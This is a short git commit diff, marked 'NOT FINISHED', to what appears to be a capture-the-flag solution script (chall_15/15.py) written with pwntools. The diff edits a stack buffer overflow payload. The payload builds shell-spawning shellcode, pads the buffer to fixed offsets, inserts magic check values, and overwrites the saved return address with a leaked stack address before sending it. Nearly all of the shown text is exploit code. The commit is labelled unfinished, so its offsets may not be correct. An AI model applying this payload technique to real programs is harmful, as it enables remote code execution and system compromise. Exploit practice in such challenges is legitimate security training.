3a72de8996129e2e019708591264774999180aa2
ajarmusch <61516473+ajarmusch@users.noreply.github.com>
2022-05-18 19:29:44 -0400

    # NOT FINISHED

--- chall_15/15.py
+++ chall_15/15.py
@@ -11,17 +11,17 @@ log.info('stack: ' + hex(stack))
 shellcode = asm(shellcraft.sh())
 
 payload  = b''
-payload += (0x128 - 0xc) * b's'
+payload += (0x128 - 0xc) * b'A'
 payload += p32(0xb16b00b5)
-payload += (0x10 - (stack + len(payload)) & 0xf) * b'S'
+payload += (0x11c - (stack + len(payload)) & 0xf) * b'B'
 
 stack += len(payload)
 log.info('stack: ' + hex(stack))
 
 payload += shellcode
-payload += (0x128 - len(payload) - 0xc) * b'A'
+payload += (0x128 - len(payload) - 0xc) * b'C'
 payload += p32(0xdeadd00d)
-payload += (0x128 - len(payload)) * b'a'
+payload += (0x128 - len(payload)) * b'D'
 payload += p64(stack)
 
 p.sendline(payload)
